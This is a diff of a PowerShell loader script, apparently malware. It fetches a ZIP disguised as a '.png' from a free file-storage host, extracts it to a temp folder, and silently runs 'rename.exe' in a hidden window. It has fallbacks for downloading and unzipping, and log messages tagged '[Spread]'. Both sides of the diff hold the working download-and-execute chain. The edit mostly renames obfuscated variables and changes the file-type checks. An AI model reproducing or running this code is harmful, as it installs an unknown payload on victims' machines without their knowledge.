@@ -1,17 +1,16 @@
-$GXjAo = "https://file.freestorage-04.bond/files/2026/10/5/4b68e7a8-adee-47d1-bd85-4c22e06b1d48/zzz.png?srl=sSOsEtVrGmndjhVDdHNVKA&exp=1791248206"
-$yyAa = [System.IO.Path]::GetRandomFileName().Replace('.','')
-$mFiU = [System.IO.Path]::GetTempPath()
-$g0WvmJjG = Join-Path $mFiU ("$yyAa" + ".zip")
-$w2H7 = Join-Path $mFiU $yyAa
-$VQ2WO6QD = "rename.exe"
-
+$tBHRLNqrxNvpAfQn = "https://file.freestorage-04.bond/files/2026/10/5/4b68e7a8-adee-47d1-bd85-4c22e06b1d48/zzz.png?srl=sSOsEtVrGmndjhVDdHNVKA&exp=1791248206"
+$un4yX9B1 = [System.IO.Path]::GetRandomFileName().Replace('.','')
+$sMpFuCP_rfYIUcACJx = [System.IO.Path]::GetTempPath()
+$WLMI_FZbKoFTc3LGf97p = Join-Path $sMpFuCP_rfYIUcACJx ("$un4yX9B1" + ".zip")
+$w9Ls4erH6HAJ58mxRt2 = Join-Path $sMpFuCP_rfYIUcACJx $un4yX9B1
+$HENbGGuEQC7yMYO4K = "rename.exe"
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 } catch { }
 
 function _spreadStop {
-    param([string]$pFjBdKnb)
-    Write-Host ('[Spread] ' + $pFjBdKnb) -ForegroundColor Red
+    param([string]$Reason)
+    Write-Host ('[Spread] ' + $Reason) -ForegroundColor Red
     try {
         if ($Host.Name -eq 'ConsoleHost' -and [Environment]::UserInteractive) {
             Read-Host 'Press Enter to exit'
@@ -24,90 +23,93 @@ function _spreadStop {
     exit 1
 }
 
-if (Test-Path -LiteralPath $w2H7) {
-    Remove-Item -LiteralPath $w2H7 -Recurse -Force -ErrorAction SilentlyContinue
+if (Test-Path -LiteralPath $w9Ls4erH6HAJ58mxRt2) {
+    Remove-Item -LiteralPath $w9Ls4erH6HAJ58mxRt2 -Recurse -Force -ErrorAction SilentlyContinue
 }
 
-$ORmB4NUv = $false
+$dlOk = $false
 try {
-    Start-BitsTransfer -Source $GXjAo -Destination $g0WvmJjG -ErrorAction Stop
-    $ORmB4NUv = $true
+    Start-BitsTransfer -Source $tBHRLNqrxNvpAfQn -Destination $WLMI_FZbKoFTc3LGf97p -ErrorAction Stop
+    $dlOk = $true
 } catch { }
-if (-not $ORmB4NUv) {
+if (-not $dlOk) {
     try {
-        (New-Object Net.WebClient).DownloadFile($GXjAo, $g0WvmJjG)
-        $ORmB4NUv = $true
+        (New-Object Net.WebClient).DownloadFile($tBHRLNqrxNvpAfQn, $WLMI_FZbKoFTc3LGf97p)
+        $dlOk = $true
     } catch { }
 }
-if (-not $ORmB4NUv) {
+if (-not $dlOk) {
     try {
-        Invoke-WebRequest -Uri $GXjAo -OutFile $g0WvmJjG -UseBasicParsing
-        $ORmB4NUv = $true
+        Invoke-WebRequest -Uri $tBHRLNqrxNvpAfQn -OutFile $WLMI_FZbKoFTc3LGf97p -UseBasicParsing
+        $dlOk = $true
     } catch {
         _spreadStop 'All download methods failed (BITS / WebClient / Invoke-WebRequest).'
     }
 }
 
-if (-not (Test-Path -LiteralPath $g0WvmJjG)) {
+if (-not (Test-Path -LiteralPath $WLMI_FZbKoFTc3LGf97p)) {
     _spreadStop 'ZIP was not saved to temp — check URL, firewall, TLS.'
 }
-$Z5nvG5P = [IO.File]::ReadAllBytes($g0WvmJjG)
-if ($Z5nvG5P.Length -ge 4 -and $Z5nvG5P[0] -eq 0x4D -and $Z5nvG5P[1] -eq 0x5A) {
-    _spreadStop ('Downloaded file is an EXE (MZ...), not a ZIP. First bytes: {0:X2} {1:X2} {2:X2} {3:X2}' -f $Z5nvG5P[0], $Z5nvG5P[1], $Z5nvG5P[2], $Z5nvG5P[3])
+$bytes = [IO.File]::ReadAllBytes($WLMI_FZbKoFTc3LGf97p)
+if ($bytes.Length -ge 3 -and $bytes[0] -eq 0xEF -and $bytes[1] -eq 0xBB -and $bytes[2] -eq 0xBF) {
+    $trimmed = New-Object byte[] ($bytes.Length - 3)
+    [Array]::Copy($bytes, 3, $trimmed, 0, $trimmed.Length)
+    [IO.File]::WriteAllBytes($WLMI_FZbKoFTc3LGf97p, $trimmed)
+    $bytes = $trimmed
 }
-if ($Z5nvG5P.Length -lt 4 -or $Z5nvG5P[0] -ne 0x50 -or $Z5nvG5P[1] -ne 0x4B) {
-    _spreadStop ('Not a ZIP (bad file or block). First bytes: {0:X2} {1:X2} {2:X2} {3:X2}' -f $Z5nvG5P[0], $Z5nvG5P[1], $Z5nvG5P[2], $Z5nvG5P[3])
+if ($bytes.Length -lt 4 -or $bytes[0] -ne 0x50 -or $bytes[1] -ne 0x4B) {
+    _spreadStop ('Not a ZIP (bad file or block). First bytes: {0} {1}' -f $bytes[0], $bytes[1])
 }
 
-$sLPMmq = $false
+$unzipped = $false
 try {
     Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop
-    [System.IO.Compression.ZipFile]::ExtractToDirectory($g0WvmJjG, $w2H7)
-    $sLPMmq = $true
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($WLMI_FZbKoFTc3LGf97p, $w9Ls4erH6HAJ58mxRt2)
+    $unzipped = $true
 } catch { }
-if (-not $sLPMmq) {
+if (-not $unzipped) {
     try {
-        if (Test-Path -LiteralPath $w2H7) {
-            Remove-Item -LiteralPath $w2H7 -Recurse -Force -ErrorAction SilentlyContinue
+        if (Test-Path -LiteralPath $w9Ls4erH6HAJ58mxRt2) {
+            Remove-Item -LiteralPath $w9Ls4erH6HAJ58mxRt2 -Recurse -Force -ErrorAction SilentlyContinue
         }
-        Expand-Archive -LiteralPath $g0WvmJjG -DestinationPath $w2H7 -Force
-        $sLPMmq = $true
+        Expand-Archive -LiteralPath $WLMI_FZbKoFTc3LGf97p -DestinationPath $w9Ls4erH6HAJ58mxRt2 -Force
+        $unzipped = $true
     } catch { }
 }
-if (-not $sLPMmq) {
+if (-not $unzipped) {
     try {
-        if (Test-Path -LiteralPath $w2H7) {
-            Remove-Item -LiteralPath $w2H7 -Recurse -Force -ErrorAction SilentlyContinue
+        if (Test-Path -LiteralPath $w9Ls4erH6HAJ58mxRt2) {
+            Remove-Item -LiteralPath $w9Ls4erH6HAJ58mxRt2 -Recurse -Force -ErrorAction SilentlyContinue
         }
-        New-Item -ItemType Directory -Path $w2H7 -Force | Out-Null
-        $LJNwFL = New-Object -ComObject Shell.Application
-        $o8c2tWP = $LJNwFL.NameSpace((Resolve-Path $g0WvmJjG).Path)
-        $Zr2jCM = $LJNwFL.NameSpace((Resolve-Path $w2H7).Path)
-        $Zr2jCM.CopyHere($o8c2tWP.Items(), 0x14)
-        $u84lginr = 120
-        $idJAL = 0
-        while ($idJAL -lt $u84lginr -and -not (Test-Path -LiteralPath (Join-Path $w2H7 $VQ2WO6QD))) {
+        New-Item -ItemType Directory -Path $w9Ls4erH6HAJ58mxRt2 -Force | Out-Null
+        $shell = New-Object -ComObject Shell.Application
+        $zip_file = $shell.NameSpace((Resolve-Path $WLMI_FZbKoFTc3LGf97p).Path)
+        $destination = $shell.NameSpace((Resolve-Path $w9Ls4erH6HAJ58mxRt2).Path)
+        $destination.CopyHere($zip_file.Items(), 0x14)
+        $maxAttempts = 120
+        $attempt = 0
+        while ($attempt -lt $maxAttempts -and -not (Test-Path -LiteralPath (Join-Path $w9Ls4erH6HAJ58mxRt2 $HENbGGuEQC7yMYO4K))) {
             Start-Sleep -Milliseconds 500
-            $idJAL++
+            $attempt++
         }
-        if (Test-Path -LiteralPath (Join-Path $w2H7 $VQ2WO6QD)) { $sLPMmq = $true }
+        if (Test-Path -LiteralPath (Join-Path $w9Ls4erH6HAJ58mxRt2 $HENbGGuEQC7yMYO4K)) { $unzipped = $true }
     } catch { }
 }
-if (-not $sLPMmq) {
+if (-not $unzipped) {
     _spreadStop 'Could not unzip (ZipFile / Expand-Archive / Shell all failed).'
 }
 
-$O9rdApfa = Join-Path $w2H7 $VQ2WO6QD
-if (-not (Test-Path -LiteralPath $O9rdApfa)) {
-    _spreadStop ('EXE not found: ' + $O9rdApfa)
+$exePath = Join-Path $w9Ls4erH6HAJ58mxRt2 $HENbGGuEQC7yMYO4K
+if (-not (Test-Path -LiteralPath $exePath)) {
+    _spreadStop ('EXE not found: ' + $exePath)
 }
 
-$QT4F = (Get-Location).Path
-Set-Location -LiteralPath $w2H7
+$xVmj612H = (Get-Location).Path
+Set-Location -LiteralPath $w9Ls4erH6HAJ58mxRt2
 try {
-    $DTt0Oi = Start-Process -FilePath $O9rdApfa -WindowStyle Hidden -PassThru
+    $qbtVh_yWI3UR0vop7p = Start-Process -FilePath $exePath -WindowStyle Hidden -PassThru
 } catch {
     _spreadStop ('Could not start rename.exe: ' + $_.Exception.Message)
 } finally {
-    if ($QT4F) { Set-Location -LiteralPath $QT4F }
+    if ($xVmj612H) { Set-Location -LiteralPath $xVmj612H }
 }
